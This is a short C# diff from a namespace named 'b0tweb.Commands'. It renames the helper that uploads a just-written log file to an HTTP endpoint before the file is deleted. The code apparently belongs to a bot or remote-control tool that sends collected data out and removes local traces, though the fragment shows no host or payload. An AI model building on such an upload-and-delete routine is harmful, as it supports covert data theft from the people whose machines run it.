@@ -43,7 +43,7 @@ namespace b0tweb.Commands
                 writer.WriteLine(log);
             }
 
-            string url = HTTPUpload.Upload(path);
+            string url = HTTPHelper.Upload(path);
 
             FileHelper.DeleteFile(path);
 
